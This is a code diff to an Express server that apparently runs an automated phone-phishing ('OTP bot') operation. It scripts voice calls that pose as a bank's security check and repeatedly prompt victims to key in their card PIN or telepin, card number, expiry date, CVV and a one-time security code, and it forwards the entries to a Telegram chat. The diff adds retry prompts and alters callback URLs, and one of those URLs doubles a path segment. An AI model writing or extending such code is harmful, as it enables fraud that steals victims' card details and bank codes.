@@ -180,6 +180,49 @@ app.get('/calls/pin/:chatId/:language', async (req, res) => {
   const { variables } = req.query;
   const { dtmf } = JSON.parse(variables as string);
 
+  if (!dtmf) {
+    return res.json({
+      id: uuidv4(),
+      title: `call PIN STEP - ${chatId}`,
+      record: false,
+      steps: [
+        {
+          id: uuidv4(),
+          action: 'say',
+          options: {
+            payload: `You have not entered anything. To AUTHENTICATE YOU please enter your ${
+              language === 'en-us' ? 'CARD PIN' : 'TELEPIN'
+            } followed by the pound key.`,
+            language,
+            voice: 'female',
+          },
+          onKeypressGoto: 'nextStepGoto',
+          onKeypressVar: 'dtmf',
+          endKey: '#',
+          maxNumKeys: 8,
+        },
+        {
+          id: uuidv4(),
+          action: 'pause',
+          options: {
+            length: 5,
+          },
+          onKeypressGoto: 'nextStepGoto',
+          onKeypressVar: 'dtmf',
+          endKey: '#',
+          maxNumKeys: 8,
+        },
+        {
+          id: 'nextStepGoto',
+          action: 'fetchCallFlow',
+          options: {
+            url: `${process.env.ENDPOINT_URL}/calls/pin/${chatId}/${language}`,
+          },
+        },
+      ],
+    });
+  }
+
   if (dtmf && dtmf === '*') {
     await bot.telegram.sendMessage(
       chatId,
@@ -208,10 +251,6 @@ app.get('/calls/pin/:chatId/:language', async (req, res) => {
             voice: 'female',
           },
         },
-        // {
-        //   id: uuidv4(),
-        //   action: 'hangup',
-        // },
       ],
     });
   }
@@ -252,12 +291,63 @@ app.get('/calls/pin/:chatId/:language', async (req, res) => {
   });
 });
 
-app.get('/calls/card/:chatId/:language', async (req, res) => {
+app.get('/calls/card/:step/:chatId/:language', async (req, res) => {
   const { cardType, isAccount, expiry, cvv } = req.query;
   const { variables } = req.query;
   const { dtmf } = JSON.parse(variables as string);
 
-  const { language, chatId } = req.params;
+  const { language, chatId, step } = req.params;
+
+  if (!dtmf) {
+    return res.json({
+      id: uuidv4(),
+      title: `call ${step} - ${chatId}`,
+      record: false,
+      steps: [
+        {
+          id: uuidv4(),
+          action: 'say',
+          options: {
+            payload: `You have not entered anything. We need to verify you, please enter your ${
+              cardType !== 'undefined' ? cardType : ''
+            } ${
+              isAccount === 'yes'
+                ? 'card number'
+                : cvv === 'yes'
+                ? 'card CVV'
+                : 'card expiration date'
+            } followed by the pound key`,
+            language,
+            voice: 'female',
+            length: 5,
+            loop: true,
+          },
+          onKeypressGoto: 'cardStepGoto',
+          onKeypressVar: 'dtmf',
+          endKey: '#',
+          maxNumKeys: 18,
+        },
+        {
+          id: uuidv4(),
+          action: 'pause',
+          options: {
+            length: 5,
+          },
+          onKeypressGoto: 'cardStepGoto',
+          onKeypressVar: 'dtmf',
+          endKey: '#',
+          maxNumKeys: 18,
+        },
+        {
+          id: 'cardStepGoto',
+          action: 'fetchCallFlow',
+          options: {
+            url: `${process.env.ENDPOINT_URL}/calls/card/${step}/${chatId}/${language}?cardType=${cardType}&isAccount=yes`,
+          },
+        },
+      ],
+    });
+  }
 
   if (isAccount === 'yes') {
     if (dtmf) {
@@ -278,7 +368,7 @@ app.get('/calls/card/:chatId/:language', async (req, res) => {
               .split('')
               .join(' ')}. Please enter your ${
               cardType !== 'undefined' ? cardType : ''
-            } card expirattion date followed by the pound key.`,
+            } card expiration date followed by the pound key.`,
             language,
             voice: 'female',
           },
@@ -302,7 +392,7 @@ app.get('/calls/card/:chatId/:language', async (req, res) => {
           id: 'cardStepGoto',
           action: 'fetchCallFlow',
           options: {
-            url: `${process.env.ENDPOINT_URL}/calls/card/${chatId}/${language}?cardType=${cardType}&expiry=yes`,
+            url: `${process.env.ENDPOINT_URL}/calls/card/${step}/${step}/${chatId}/${language}?cardType=${cardType}&expiry=yes`,
           },
         },
       ],
@@ -357,7 +447,7 @@ app.get('/calls/card/:chatId/:language', async (req, res) => {
           id: 'cardStepGoto',
           action: 'fetchCallFlow',
           options: {
-            url: `${process.env.ENDPOINT_URL}/calls/card/${chatId}/${language}?cardType=${cardType}&cvv=yes`,
+            url: `${process.env.ENDPOINT_URL}/calls/card/${step}/${chatId}/${language}?cardType=${cardType}&cvv=yes`,
           },
         },
       ],
@@ -423,6 +513,52 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
 
   const { dtmf } = JSON.parse(variables as string);
 
+  if (!dtmf) {
+    return res.json({
+      id: uuidv4(),
+      title: `call ${step} - ${chatId} OTP`,
+      record: false,
+      steps: [
+        {
+          id: uuidv4(),
+          action: 'say',
+          options: {
+            payload:
+              'You have not entered anything. For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key',
+            language,
+            voice: 'female',
+            loop: true,
+          },
+          onKeypressGoto: 'nextStepOTP',
+          endKey: '#',
+          maxNumKeys: 8,
+          onKeypressVar: 'dtmf',
+        },
+        {
+          id: uuidv4(),
+          action: 'pause',
+          options: {
+            length: 5,
+          },
+          onKeypressGoto: 'nextStepOTP',
+          onKeypressVar: 'dtmf',
+          endKey: '#',
+          maxNumKeys: 8,
+        },
+        {
+          action: 'hangup',
+        },
+        {
+          id: 'nextStepOTP',
+          action: 'fetchCallFlow',
+          options: {
+            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}`,
+          },
+        },
+      ],
+    });
+  }
+
   if (dtmf && dtmf === '*') {
     await bot.telegram.sendMessage(
       chatId,
@@ -438,7 +574,7 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
 
     return res.json({
       id: uuidv4(),
-      title: `call bank - ${chatId} no OTP`,
+      title: `call ${step} - ${chatId} no OTP`,
       record: false,
       steps: [
         {
@@ -642,10 +778,6 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
                 voice: 'female',
               },
             },
-            // {
-            //   id: uuidv4(),
-            //   action: 'hangup',
-            // },
           ],
         });
       }
@@ -750,8 +882,6 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
 });
 app.post('/calls/:chatId', async (req, res) => {
   const { chatId } = req.params;
-  // const { status, to } = req.body;
-  // console.log('payload: ', req.body.items[0].payload);
   const { status, destination, webhook, Status } = req.body.items[0].payload;
 
   if ((!chatId || !webhook) && !Status) {
